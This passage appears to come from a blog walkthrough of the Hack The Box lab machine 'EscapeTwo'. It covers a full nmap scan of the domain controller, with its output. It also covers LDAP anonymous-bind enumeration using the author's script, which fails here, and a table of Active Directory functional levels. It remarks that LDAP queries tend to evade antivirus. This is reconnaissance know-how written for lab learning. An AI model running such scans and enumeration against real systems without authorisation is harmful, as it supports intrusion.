+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/EscapeTwo/scans/nmap%20%20%f0%9f%8d%a3%20main%20%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2007:56:07%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202025-01-13%2007:56%20GMT%0aNmap%20scan%20report%20for%2010.129.146.182%0aHost%20is%20up%20%280.045s%20latency%29.%0aNot%20shown:%2065509%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202025-01-13%2007:59:29Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%202025-01-13T08:01:07&#43;00:00;%20&#43;1s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.sequel.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.sequel.htb%0a%7c%20Not%20valid%20before:%202024-06-08T17:35:00%0a%7c_Not%20valid%20after:%20%202025-06-08T17:35:00%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a464/tcp%20%20%20open%20%20kpasswd5?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.sequel.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.sequel.htb%0a%7c%20Not%20valid%20before:%202024-06-08T17:35:00%0a%7c_Not%20valid%20after:%20%202025-06-08T17:35:00%0a%7c_ssl-date:%202025-01-13T08:01:07&#43;00:00;%20&#43;1s%20from%20scanner%20time.%0a1433/tcp%20%20open%20%20ms-sql-s%20%20%20%20%20%20Microsoft%20SQL%20Server%202019%2015.00.2000.00;%20RTM%0a%7c%20ms-sql-info:%0a%7c%20%20%2010.129.146.182:1433:%0a%7c%20%20%20%20%20Version:%0a%7c%20%20%20%20%20%20%20name:%20Microsoft%20SQL%20Server%202019%20RTM%0a%7c%20%20%20%20%20%20%20number:%2015.00.2000.00%0a%7c%20%20%20%20%20%20%20Product:%20Microsoft%20SQL%20Server%202019%0a%7c%20%20%20%20%20%20%20Service%20pack%20level:%20RTM%0a%7c%20%20%20%20%20%20%20Post-SP%20patches%20applied:%20false%0a%7c_%20%20%20%20TCP%20port:%201433%0a%7c%20ms-sql-ntlm-info:%0a%7c%20%20%2010.129.146.182:1433:%0a%7c%20%20%20%20%20Target_Name:%20SEQUEL%0a%7c%20%20%20%20%20NetBIOS_Domain_Name:%20SEQUEL%0a%7c%20%20%20%20%20NetBIOS_Computer_Name:%20DC01%0a%7c%20%20%20%20%20DNS_Domain_Name:%20sequel.htb%0a%7c%20%20%20%20%20DNS_Computer_Name:%20DC01.sequel.htb%0a%7c%20%20%20%20%20DNS_Tree_Name:%20sequel.htb%0a%7c_%20%20%20%20Product_Version:%2010.0.17763%0a%7c_ssl-date:%202025-01-13T08:01:07&#43;00:00;%20&#43;1s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=SSL_Self_Signed_Fallback%0a%7c%20Not%20valid%20before:%202025-01-13T07:53:13%0a%7c_Not%20valid%20after:%20%202055-01-13T07:53:13%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.sequel.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.sequel.htb%0a%7c%20Not%20valid%20before:%202024-06-08T17:35:00%0a%7c_Not%20valid%20after:%20%202025-06-08T17:35:00%0a%7c_ssl-date:%202025-01-13T08:01:07&#43;00:00;%20&#43;1s%20from%20scanner%20time.%0a3269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20sequel.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%202025-01-13T08:01:07&#43;00:00;%20&#43;1s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.sequel.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.sequel.htb%0a%7c%20Not%20valid%20before:%202024-06-08T17:35:00%0a%7c_Not%20valid%20after:%20%202025-06-08T17:35:00%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-title:%20Not%20Found%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a9389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a47001/tcp%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a49664/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49665/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49666/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49685/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a49686/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49689/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49702/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49718/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49737/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a61431/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2889%25%29%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2889%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20DC01;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202025-01-13T08:00:32%0a%7c_%20%20start_date:%20N/A%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%7c_clock-skew:%20mean:%201s,%20deviation:%200s,%20median:%200s%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20258.16%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 07:56:07 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-13 07:56 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.146.182
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.045s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65509</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-01-13 07:59:29Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-08T17:35:00
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-06-08T17:35:00
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-08T17:35:00
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-06-08T17:35:00
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-info:
+</span></span><span style="display:flex;"><span>|   10.129.146.182:1433:
+</span></span><span style="display:flex;"><span>|     Version:
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
+</span></span><span style="display:flex;"><span>|   10.129.146.182:1433:
+</span></span><span style="display:flex;"><span>|     Target_Name: SEQUEL
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: SEQUEL
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC01
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: sequel.htb
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: DC01.sequel.htb
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: sequel.htb
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-01-13T07:53:13
+</span></span><span style="display:flex;"><span>|_Not valid after:  2055-01-13T07:53:13
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-08T17:35:00
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-06-08T17:35:00
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-08T17:35:00
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-06-08T17:35:00
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49686/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49689/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49702/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49718/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49737/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>61431/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2025-01-13T08:00:32
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 258.16 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Findings</strong>:</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
+<ul>
+<li>
+<p>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.</p>
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapire">https://github.com/bloodstiller/ldapire</a></li>
+<li><a href="https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb">https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb</a>
+<ul>
+<li><code>python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass</code>
+<ul>
+<li>It will dump general information &amp; also detailed &amp; simple information including:
+<ul>
+<li>Groups</li>
+<li>Computers</li>
+<li>Users</li>
+<li>All domain objects</li>
+<li>A file containing all description fields</li>
+<li>It will also search the domain for any service/svc accounts and place them in a folder too.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ol>
+<li><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/EscapeTwo/scans/ldap%20%20%f0%9f%8d%a3%20main%20%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2007:58:14%20zsh%20%e2%9d%af%20python3%20/home/kali/windowsTools/enumeration/ldapire/ldapire.py%20$box%20-u%20$user%20-p%20$pass%0a%0a%0a------------------------------------------------------------%0a%20Server%20Information%0a------------------------------------------------------------%0a%20%20%e2%80%a2%20IP%20Address%20%20:%2010.129.146.182%0a%20%20%e2%80%a2%20Domain%20Name%20:%20sequel.htb%0a%20%20%e2%80%a2%20Server%20Name%20:%20DC01%0a%20%20%e2%80%a2%20Forest%20Level:%207%0a%20%20%e2%80%a2%20Domain%20Level:%207">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/EscapeTwo/scans/ldap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 07:58:14 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span> Server Information
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span>  • IP Address  : 10.129.146.182
+</span></span><span style="display:flex;"><span>  • Domain Name : sequel.htb
+</span></span><span style="display:flex;"><span>  • Server Name : DC01
+</span></span><span style="display:flex;"><span>  • Forest Level: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  • Domain Level: <span style="color:#ae81ff">7</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>It turns out the anonymous bind is (+NOT+) enabled and we get the below information &amp; our creds do not appear to work for the LDAP.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%0a------------------------------------------------------------%0a%20Connection%20Attempts%0a------------------------------------------------------------%0a%20%20%e2%80%a2%20Attempting%20SSL%20connection...%0a%20%20%e2%9a%a0%ef%b8%8f%20%20Connection%20established%20but%20no%20read%20access%0a%20%20%e2%80%a2%20Attempting%20non-SSL%20connection...%0a%20%20%e2%9a%a0%ef%b8%8f%20%20Connection%20established%20but%20no%20read%20access%0a%0a------------------------------------------------------------%0a%20Connection%20Failed%0a------------------------------------------------------------%0a%20%20%e2%9a%a0%ef%b8%8f%20%20Could%20not%20establish%20LDAP%20connection%0a%20%20%e2%80%a2%20Anonymous%20bind%20may%20be%20disabled%20%28good%20security%20practice%29%0a%20%20%e2%80%a2%20Credentials%20may%20be%20incorrect%0a%20%20%e2%80%a2%20Server%20may%20be%20unreachable%0a%20%20%e2%80%a2%20LDAP/LDAPS%20ports%20may%20be%20filtered">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span> Connection Attempts
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span>  • Attempting SSL connection...
+</span></span><span style="display:flex;"><span>  ⚠️  Connection established but no read access
+</span></span><span style="display:flex;"><span>  • Attempting non-SSL connection...
+</span></span><span style="display:flex;"><span>  ⚠️  Connection established but no read access
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span> Connection Failed
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span>  ⚠️  Could not establish LDAP connection
+</span></span><span style="display:flex;"><span>  • Anonymous bind may be disabled <span style="color:#f92672">(</span>good security practice<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  • Credentials may be incorrect
+</span></span><span style="display:flex;"><span>  • Server may be unreachable
+</span></span><span style="display:flex;"><span>  • LDAP/LDAPS ports may be filtered</span></span></code></pre></div>
+    
+</div>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionality level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  • Forest Level: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  • Domain Level: <span style="color:#ae81ff">7</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Functional Level Number</th>
+          <th>Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>Windows 2000</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>+Note+:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name &amp; domain name<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span> Server Information
+</span></span><span style="display:flex;"><span>------------------------------------------------------------
+</span></span><span style="display:flex;"><span>  • IP Address  : 10.129.146.182
+</span></span><span style="display:flex;"><span>  • Domain Name : sequel.htb
+</span></span><span style="display:flex;"><span>  • Server Name : DC01</span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+</ul>
+<h4 id="updating-etc-hosts-and-variables">Updating ETC/HOSTS &amp; Variables:</h4>
+<ul>
+<li>
+<p><strong>Updated Domain &amp; Machine Variables for Testing</strong>:</p>
+<ul>
+<li>Now that I have this information, I can update the <code>domain</code> and <code>machine</code> variables used in tests:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
